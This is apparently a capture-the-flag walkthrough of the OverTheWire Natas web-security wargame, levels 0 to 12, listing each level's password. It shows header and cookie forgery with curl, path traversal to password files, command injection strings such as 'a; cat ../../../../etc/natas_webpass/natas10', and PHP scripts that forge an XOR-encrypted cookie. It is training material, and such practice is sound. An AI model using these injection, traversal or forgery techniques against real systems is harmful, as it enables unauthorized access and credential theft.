﻿Over the Wire's **Natas** Walkthrough by AlbertoSpinella.

Don't be sly! Try to solve the challenges on your own before comparing with my solutions.

# Index
1. [natas 0](https://github.com/AlbertoSpinella/over-the-wire-natas-partial#natas-0)
2. [natas 0 -> 1](https://github.com/AlbertoSpinella/over-the-wire-natas-partial#natas-0---1)
3. [natas 1 -> 2](https://github.com/AlbertoSpinella/over-the-wire-natas-partial#natas-1---2)
4. [natas 2 -> 3](https://github.com/AlbertoSpinella/over-the-wire-natas-partial#natas-2---3)
5. [natas 3 -> 4](https://github.com/AlbertoSpinella/over-the-wire-natas-partial#natas-3---4)
6. [natas 4 -> 5](https://github.com/AlbertoSpinella/over-the-wire-natas-partial#natas-4---5)
7. [natas 5 -> 6](https://github.com/AlbertoSpinella/over-the-wire-natas-partial#natas-5---6)
8. [natas 6 -> 7](https://github.com/AlbertoSpinella/over-the-wire-natas-partial#natas-6---7)
9. [natas 7 -> 8](https://github.com/AlbertoSpinella/over-the-wire-natas-partial#natas-7---8)
10. [natas 8 -> 9](https://github.com/AlbertoSpinella/over-the-wire-natas-partial#natas-8---9)
11. [natas 9 -> 10](https://github.com/AlbertoSpinella/over-the-wire-natas-partial#natas-9---10)
12. [natas 10 -> 11](https://github.com/AlbertoSpinella/over-the-wire-natas-partial#natas-10---11)
13. [natas 11 -> 12](https://github.com/AlbertoSpinella/over-the-wire-natas-partial#natas-11---12)

## natas 0

 - Visit the link: http://natas0.natas.labs.overthewire.org
	 - username: natas0
	 - password: natas0

## natas 0 -> 1
 - Right-click and select "Inspect".
 - Open the first `<div>` and you'll find the password.
 - Visit the link: http://natas1.natas.labs.overthewire.org
	 - username: natas1
	 - password: gtVrDuiDfck831PqWsLEZy5gyDz1clto

## natas 1 -> 2

 - Press F12.
 - Open the first `<div>` and you'll find the password.
 - Visit the link: http://natas2.natas.labs.overthewire.org
	 - username: natas2
	 - password: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

## natas 2 -> 3
 - Press F12.
 - Open the first `<div>`.
 - There's a `<img>` tag. Open the src link.
 - You're now at `/files/pixel.png`. Remove the pixel.png to visit `/files`.
 - Click on `users.txt` to find the password for natas3.
 - Visit the link: http://natas3.natas.labs.overthewire.org
	 - username: natas3
	 - password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

## natas 3 -> 4
 - Press F12.
 - Since it says "Not even Google will find it this time...", append to the link `/robots.txt`.
 - Replace /robots.txt with `/s3cr3t`. Then click on the file `users.txt` to find the password for natas4.
 - Visit the link: http://natas4.natas.labs.overthewire.org
	 - username: natas4
	 - password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

## natas 4 -> 5
 - Click on "refresh page" to see that the Referer header change.
 - Open a terminal and run the following command in order to generate the base64 token from username and password:
	- `generate_token=$(echo -ne "natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ" | base64 --wrap 0)`
 - Now run the following command to make a request with a specific Referer header:
	- `curl -H "Authorization: Basic $generate_token" --referer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org`
 - Visit the link: http://natas5.natas.labs.overthewire.org
	- username: natas5
	- password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

## natas 5 -> 6
 - Generate the base64 token and save it to a variable:
	- `generate_token=$(echo -ne "natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq" | base64 --wrap 0)`
 - Try the following curl:
	- `curl -H "Authorization: Basic $generate_token" http://natas5.natas.labs.overthewire.org`
 - Display headers adding `-I`:
	- `curl -H "Authorization: Basic $generate_token" -I http://natas5.natas.labs.overthewire.org`
 - As you can see, there's a header loggedin=0. Try setting it to 1 in the curl:
	- `curl -H "Authorization: Basic $generate_token" -H "Cookie: loggedin=1" http://natas5.natas.labs.overthewire.org`
 - Visit the link: http://natas6.natas.labs.overthewire.org
	- username: natas6
	- password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

## natas 6 -> 7
 - Generate the base64 token and save it to a variable:
	- `generate_token=$(echo -ne "natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1" | base64 --wrap 0)`
 - On the browser, and click on "View sourcecode".
 - As you can see, there's a line `include "includes/secret.inc";`. Try to visit the page: `http://natas5.natas.labs.overthewire.org/includes/secret.inc`. If you can't see anything, try to curl:
	 - `curl -H "Authorization: Basic $generate_token" http://natas5.natas.labs.overthewire.org/includes/secret.inc`
 - Copy the secret, go back to natas6 homepage and paste it in the "Input secret" field.
 - Visit the link: http://natas7.natas.labs.overthewire.org
	- username: natas7
	- password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

## natas 7 -> 8
 - Press F12.
 - Open the first `<div>` and find the hint. Try visit the following link: http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
 - Visit the link: http://natas8.natas.labs.overthewire.org
	- username: natas8
	- password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

## natas 8 -> 9
 - On the browser, and click on "View sourcecode".
 - Look at the `encodeSecret()` function. It encode to base64, then revert the string, then convert to hex. Execute this PHP script, which do the inverse operations:
```
<?php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";
function decodeSecret($encodedSecret) {
    print base64_decode(strrev(hex2bin($encodedSecret)));
}
decodeSecret($encodedSecret);
?>
```
 - Once you have found the secret, go back to natas8 homepage and paste it in the "Input secret" field.
 - Visit the link: http://natas9.natas.labs.overthewire.org
	- username: natas9
	- password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

# natas 9 -> 10
 - Try entering something in the field, then press Search. Then click on View sourcecode.
 - As you can't see, the input isn't sanitized. Try to search `a; ls -l`.
 - Now search `a; pwd` to print your current directory.
 - Now search `a; ls -la ../../../../etc/natas_webpass`.
 - In the end, search `a; cat ../../../../etc/natas_webpass/natas10`.
 - Visit the link: http://natas10.natas.labs.overthewire.org
	- username: natas10
	- password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

# natas 10 -> 11
 - Take a look at the source code. It deny strings with certain characters.
 - In the Search field, enter two random letters, like `q z`, with a space between. This is necessary to understand that it searches both.
 - Try to search the following:
 	- `a /etc/natas_webpass/natas11`
 - Probably, the password doesn't contain an `a` character. Try searching the following:
 	- `b /etc/natas_webpass/natas11`
 - As last, search:
 	- `c /etc/natas_webpass/natas11`
 - Visit the link: http://natas11.natas.labs.overthewire.org
	- username: natas11
	- password: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

# natas 11 -> 12
 - Press F12.
 - Go to Archiviation and find the cookie "data".
 - Take a look at the source code.
 - Execute this PHP script where `$b64_decode` is the content of the cookie:
```
<?php

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in, $key) {
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function printData($defaultdata) {
    $b64_decode = base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSMX4MNzF%2BaAw");
    $default = json_encode($defaultdata);
    print(xor_encrypt($b64_decode, $default));
}

printData($defaultdata);
?>
```
 - The key is **qw8J**.
 - Execute this second PHP script that uses this key:
```
<?php

$showpassword = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");

function xor_encrypt($in, $key) {
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function printData($defaultdata) {
    $default = json_encode($defaultdata);
    
    print(base64_encode(xor_encrypt($default, "qw8J")));
}

printData($showpassword);
?>
```
 - The result is a base64 encoded cookie. Replace it in the browser, then click on "Set color" button.
 - Visit the link: http://natas12.natas.labs.overthewire.org
	- username: natas12
	- password: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3